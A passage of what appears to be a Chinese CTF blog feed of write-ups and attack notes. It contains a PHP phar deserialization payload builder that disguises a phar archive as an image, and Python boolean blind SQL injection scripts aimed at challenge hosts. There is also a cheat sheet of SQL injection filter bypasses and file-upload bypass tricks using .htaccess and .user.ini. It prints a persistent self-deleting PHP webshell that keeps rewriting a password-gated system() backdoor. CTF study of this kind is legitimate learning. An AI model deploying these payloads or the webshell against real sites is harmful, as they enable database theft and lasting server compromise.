punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>   <span class="token comment">//$this->source = phar://phar.jpg</span>        <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">_show</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/http|https|file:|gopher|dict|\.\.|f1ag/i'</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/http|https|file:|gopher|dict|\.\./i"</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker~"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">source</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">get</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">params</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$value</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">file_get</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$text</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$text</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>看到<code>file_get_contents</code>和<code>phar</code>还不明白吗</del><br>显然是<code>phar</code>反序列化</p><p>构造</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">C1e4r</span><span class="token punctuation">&#123;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Show</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$source</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$str</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Test</span><span class="token punctuation">&#123;</span>     <span class="token keyword">public</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token keyword">public</span> <span class="token variable">$params</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"source"</span><span class="token operator">=></span><span class="token string double-quoted-string">"var/www/html/f1ag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">C1e4r</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Show</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">-></span><span class="token property">str</span><span class="token operator">-></span><span class="token property">str</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"str"</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Test</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"w.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$b</span><span class="token operator">-></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">copy</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"w.phar"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"a.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接访问<code>/upload</code>得到上传文件名<br>利用<code>phar</code>协议查看即可</p><h1 id="lt-WUSTCTF2020-gt-颜值成绩查询"><a href="#lt-WUSTCTF2020-gt-颜值成绩查询" class="headerlink" title="&lt;WUSTCTF2020&gt;颜值成绩查询"></a>&lt;WUSTCTF2020&gt;颜值成绩查询</h1><p>常规布尔盲注，甚至没有什么过滤</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requeststar_url<span class="token operator">=</span><span class="token string">"..............."</span>par<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"stunum"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span>an<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">>"</span></span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment">#par["stunum"]=f"0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#123;i&#125;,1))=&#123;w&#125;)"</span>        <span class="token comment">#par["stunum"]=f"0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),&#123;i&#125;,1))=&#123;w&#125;)"</span>        <span class="token comment">#par["stunum"]=f"0^(ascii(substr((select(group_concat(value))from(flag)),&#123;i&#125;,1))=&#123;w&#125;)"</span>        response<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>tar_url<span class="token punctuation">,</span>params<span class="token operator">=</span>par<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"admin"</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            an<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>an<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="lt-GYCTF2020-gt-Ezsqli"><a href="#lt-GYCTF2020-gt-Ezsqli" class="headerlink" title="&lt;GYCTF2020&gt;Ezsqli"></a>&lt;GYCTF2020&gt;Ezsqli</h1><p>打开题目，显然是SQL注入</p><p>测试为数字型注入，测试过滤的关键字，可用布尔盲注，脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requeststar_url<span class="token operator">=</span><span class="token string">"http://7772275b-dfab-48c8-99c0-5bbf6c3f97c2.node4.buuoj.cn:81/index.php"</span>get_data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span>query_table<span class="token operator">=</span><span class="token string">"sys.schema_table_statistics"</span>query_column_1<span class="token operator">=</span><span class="token string">"table_name"</span>query_column_2<span class="token operator">=</span><span class="token string">"table_schema"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        get_data<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0^(ascii(substr((select group_concat(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>query_column_1<span class="token punctuation">&#125;</span></span><span class="token string">) from </span><span class="token interpolation"><span class="token punctuation">&#123;</span>query_table<span class="token punctuation">&#125;</span></span><span class="token string"> where </span><span class="token interpolation"><span class="token punctuation">&#123;</span>query_column_2<span class="token punctuation">&#125;</span></span><span class="token string">=database()),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>w<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span>        repo<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>tar_url<span class="token punctuation">,</span>data<span class="token operator">=</span>get_data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Nu1L"</span> <span class="token keyword">in</span> repo<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><del>这个脚本还是挺慢的，但懒得写二分，趁着跑脚本划水也挺好的</del><br>得到表名</p><blockquote><p>users233333333333333,f1ag_1s_h3r3_hhhhh</p></blockquote><p><code>union</code>被过滤了，采用逐个对比的方法查字段数，</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">id=0^((select 1,2)>(select * from f1ag_1s_h3r3_hhhhh))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>回显<code>Nu1L</code>，说明字段数为2<br>尝试逐个读取，但<code>limit</code>被过滤了，好在只有一行数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requeststar_url<span class="token operator">=</span><span class="token string">"http://7772275b-dfab-48c8-99c0-5bbf6c3f97c2.node4.buuoj.cn:81/index.php"</span>get_data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">&#125;</span>answer<span class="token operator">=</span><span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> w <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        suffix<span class="token operator">=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span>        get_data<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"0^((select '</span><span class="token interpolation"><span class="token punctuation">&#123;</span>answer<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>suffix<span class="token punctuation">&#125;</span></span><span class="token string">',1)>(select * from f1ag_1s_h3r3_hhhhh))"</span></span>        repo<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>tar_url<span class="token punctuation">,</span>data<span class="token operator">=</span>get_data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">"Nu1L"</span> <span class="token keyword">in</span> repo<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            answer<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>w<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>answer<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果爆出一堆零，读取第二列，得到flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;lt-BJDCTF2020-gt-EasySearch-1&quot;&gt;&lt;a href=&quot;#lt-BJDCTF2020-gt-EasySearch-1&quot; class=&quot;headerlink&quot; title=&quot;&amp;lt;BJDCTF2020&amp;gt;EasySearch 1&quot;&gt;&lt;/</summary>
      
    
    
    
    <category term="wp" scheme="http://example.com/categories/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>sql注入可利用的表</title>
    <link href="http://example.com/%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E8%A1%A8/"/>
    <id>http://example.com/%E5%8F%AF%E5%88%A9%E7%94%A8%E7%9A%84%E8%A1%A8/</id>
    <published>2023-09-05T02:14:08.603Z</published>
    <updated>2023-09-06T03:32:08.533Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MYSQL中的可利用的表"><a href="#MYSQL中的可利用的表" class="headerlink" title="MYSQL中的可利用的表"></a>MYSQL中的可利用的表</h1><p><code>information_schema.tables</code> <em>所有库和表的统计</em></p><pre><code>table_schema  table_name  </code></pre><p><code>information_schema.columns</code> <em>包含库名，表名，列名</em></p><pre><code>table_schema table_namecolumn_name</code></pre><p><code>mysql.innodb_table_stats</code></p><pre><code> table_name  database_name</code></pre><p><code>mysql.innodb_index_stats</code> </p><pre><code>table_name database_name</code></pre><p><code>sys.schema_table_statistics</code> </p><pre><code>table_schema table_name</code></pre><p><code>sys.schema_table_statistics_with_buffer</code> </p><pre><code>table_schema table_name</code></pre><p><code>sys.schema_auto_increment_columns</code> </p><pre><code>table_schema table_name</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;MYSQL中的可利用的表&quot;&gt;&lt;a href=&quot;#MYSQL中的可利用的表&quot; class=&quot;headerlink&quot; title=&quot;MYSQL中的可利用的表&quot;&gt;&lt;/a&gt;MYSQL中的可利用的表&lt;/h1&gt;&lt;p&gt;&lt;code&gt;information_schema.table</summary>
      
    
    
    
    <category term="SQL injection" scheme="http://example.com/categories/SQL-injection/"/>
    
    
    <category term="basic" scheme="http://example.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>不死马</title>
    <link href="http://example.com/%E4%B8%8D%E6%AD%BB%E9%A9%AC/"/>
    <id>http://example.com/%E4%B8%8D%E6%AD%BB%E9%A9%AC/</id>
    <published>2023-09-05T01:29:34.714Z</published>
    <updated>2022-05-25T07:22:56.269Z</updated>
    
    <content type="html"><![CDATA[<p>不死马，即难以清除的木马。<br>一般原理为：在可以上传文件的情况下，上传一个可执行文件，这个文件的作用是在服务端创建一个进程，然后删除自身，创建的进程会不停的在服务端生成木马文件。<br>网上最常见的脚本为</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'.shell.php'</span><span class="token punctuation">;</span><span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php if(md5($_GET["pass"])=="2591c98b70119fe624898b1e424b5e91")&#123;@system($_POST[cmd]);&#125; ?>'</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;不死马，即难以清除的木马。&lt;br&gt;一般原理为：在可以上传文件的情况下，上传一个可执行文件，这个文件的作用是在服务端创建一个进程，然后删除自身，创建的进程会不停的在服务端生成木马文件。&lt;br&gt;网上最常见的脚本为&lt;/p&gt;
&lt;pre class=&quot;line-numbers lan</summary>
      
    
    
    
    <category term="file upload" scheme="http://example.com/categories/file-upload/"/>
    
    
    <category term="basic" scheme="http://example.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>sql injection</title>
    <link href="http://example.com/sql%20injection/"/>
    <id>http://example.com/sql%20injection/</id>
    <published>2023-09-05T01:29:34.696Z</published>
    <updated>2022-04-25T05:10:20.722Z</updated>
    
    <content type="html"><![CDATA[<ol><li>堆叠注入</li><li>union注入</li><li>报错注入 updatexml() , extractvalue()</li><li>布尔盲注 if(,,)  、^</li></ol><p><strong>截断字符串</strong></p><ul><li>substr()</li><li>mid()</li><li>substring()</li><li>left() </li><li>right()</li></ul><p><strong>常用函数</strong></p><ul><li>database()</li><li>version()</li><li>user()</li><li>concat()</li><li>group_concat()</li><li></li></ul><p><strong>绕过</strong></p><ul><li>（）和Tab 代替空格</li><li>双写</li><li>大小写</li><li>内联注释</li><li>handler &lt;table&gt; open &lt;name&gt;;handler &lt;name&gt; read first</li></ul><p><strong>可利用的表</strong></p><ul><li>information_schema.tables    <code>table_schema</code> <code>table_name</code></li><li>information_schema.columns <code>table_schema</code> <code>table_name</code> <code>column_name</code></li><li></li><li>mysql.innodb_table_stats    <code>table_name</code> <code>database_name</code></li><li>mysql.innodb_index_stats <code>table_name</code> <code>database_name</code></li><li></li><li>sys.schema_table_statistics <code>table_schema</code> <code>table_name</code> </li><li>sys.schema_table_statistics_with_buffer <code>table_schema</code> <code>table_name</code></li><li>sys.schema_auto_increment_columns <code>table_schema</code> <code>table_name</code> </li></ul><p><strong>额外</strong></p><ul><li>无列名注入</li><li></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;堆叠注入&lt;/li&gt;
&lt;li&gt;union注入&lt;/li&gt;
&lt;li&gt;报错注入 updatexml() , extractvalue()&lt;/li&gt;
&lt;li&gt;布尔盲注 if(,,)  、^&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;截断字符串&lt;/strong&gt;&lt;/p&gt;
</summary>
      
    
    
    
    <category term="SQL injection" scheme="http://example.com/categories/SQL-injection/"/>
    
    
    <category term="basic" scheme="http://example.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>shell upload</title>
    <link href="http://example.com/shell%20upload/"/>
    <id>http://example.com/shell%20upload/</id>
    <published>2023-09-05T01:29:34.695Z</published>
    <updated>2022-04-25T05:04:46.140Z</updated>
    
    <content type="html"><![CDATA[<p>前端文件后缀限制</p><ol><li>抓包修改</li></ol><p>后端文件后缀限制</p><ol><li>上传.user.ini文件或.htaccess文件<blockquote><p>PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。</p><p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p><p>在 .user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p><p>两个新的 INI 指令， user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p><p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p><p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p></blockquote></li></ol><p>.user.ini</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">auto_prepend_file=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>file_path</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>.htaccess</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">AddType application/x-httpd-php .jpg <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>FileMatch</span> <span class="token attr-name">"&lt;file_name</span><span class="token punctuation">></span></span>">SetHandler application/x-httpd-php<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>FileMatch</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="2"><li>利用解析漏洞，加上无法解析的后缀，如上传shell.php.abc</li></ol><p>文件头检查</p><ol><li>加上图片文件头，如GIF8a</li></ol><p>文件内容检查</p><ol><li>&lt;script language=’php’&gt; 代替 &lt;?php</li><li></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前端文件后缀限制&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;抓包修改&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;后端文件后缀限制&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;上传.user.ini文件或.htaccess文件&lt;blockquote&gt;
&lt;p&gt;PHP 支持基于每个目录的 INI 文件配置。此类文件 仅被 CG</summary>
      
    
    
    
    <category term="file upload" scheme="http://example.com/categories/file-upload/"/>
    
    
    <category term="basic" scheme="http://example.com/tags/basic/"/>
    
  </entry>
  
  <entry>
    <title>php字符串与数值比较</title>
    <link href="http://example.com/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83/"/>
    <id>http://example.com/php%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%8E%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83/</id>
    <published>2023-09-05T01:29:34.692Z</published>
    <updated>2022-04-25T05:07:26.010Z</updated>
    
